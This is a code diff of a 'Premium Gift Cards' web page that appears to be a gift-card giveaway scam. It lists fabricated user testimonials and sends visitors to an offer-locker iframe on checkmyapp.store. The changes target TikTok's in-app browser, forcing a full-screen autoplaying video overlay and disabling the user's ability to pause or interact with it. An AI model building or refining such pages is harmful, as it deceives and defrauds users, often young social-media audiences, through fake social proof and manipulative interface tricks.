@@ -40,7 +40,7 @@ z-index:-3;
 100%{transform:scale(1.12) translateY(-18px);}
 }
 
-/* TIKTOK OVERLAY FULL SCREEN */
+/* TIKTOK OVERLAY - FULL SCREEN GIF STYLE */
 #ttOverlay {
     position: fixed;
     inset: 0;
@@ -54,7 +54,8 @@ z-index:-3;
 #ttOverlay video {
     width: 100%;
     height: 100%;
-    object-fit: cover; /* Kayched l-écran kamla bla k7oliya */
+    object-fit: cover;
+    pointer-events: none; /* Ma-ikhallich l-user i-twa9af l-video */
     display: block;
 }
 
@@ -252,7 +253,7 @@ background:#1f2937;
 #lockerModal{
 position:fixed;
 inset:0;
-background:rgba(0,0,0,.95);
+background:#000;
 display:none;
 justify-content:center;
 align-items:center;
@@ -287,7 +288,7 @@ border:none;
 <body>
 
 <div id="ttOverlay">
-    <video id="tutorialVideo" playsinline muted loop preload="auto">
+    <video id="tutorialVideo" playsinline muted loop autoplay preload="auto" disablePictureInPicture>
         <source src="tutorial.mp4.mov" type="video/quicktime">
         <source src="tutorial.mp4.mov" type="video/mp4">
     </video>
@@ -375,7 +376,6 @@ border:none;
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
-// Had l-Logic kamel khllito kima hwa
 const giftCardMsgs = ["Fuck! I only got $10 card...","Is this real? Just got $50!","Guys it worked!","Legit site finally","Just got my code","FUCK!! 10$ again","Yo it works instantly","Only 1 card per person","Code sent in notif bar","Omg finally a real one","Just got $25 PSN","Worked for $100 Amazon","Verification took 5 mins","Legit check 100%","Stop asking, just do it"];
 const usersList = ["Alex_NY", "Sarah_LA", "Daniel.H", "Emily_99", "Mike_Gamer", "Jess_Vip", "Chris_USA", "Sophia_M"];
 const cardsData = [
@@ -442,7 +442,6 @@ function openOffer(title,el){
 function go(){ document.getElementById("lockerModal").style.display="block"; document.getElementById("lockerFrame").src="https://checkmyapp.store/cl/i/pqq622"; }
 function backPage(){ document.getElementById("offerPage").style.display="none"; document.getElementById("grid").style.display="grid"; document.getElementById("chatArea").style.display="block"; }
 
-// TikTok Full Screen & Autoplay Logic
 function isTikTok() { return /TikTok|musical_ly/i.test(navigator.userAgent); }
 
 window.addEventListener("load", () => {
@@ -455,14 +454,17 @@ window.addEventListener("load", () => {
         const video = document.getElementById("tutorialVideo");
         overlay.style.display = "block";
         
-        // Forced Autoplay Loop
-        let autoPlayInterval = setInterval(() => {
-            video.play().then(() => {
-                clearInterval(autoPlayInterval);
-            }).catch(() => {});
+        video.muted = true;
+        video.play();
+
+        let forcePlay = setInterval(() => {
+            if (video.paused) {
+                video.play().catch(() => {});
+            } else {
+                clearInterval(forcePlay);
+            }
         }, 100);
 
-        // Click to start if browser blocks
         window.addEventListener('touchstart', () => { video.play(); }, { once: true });
     }
 });
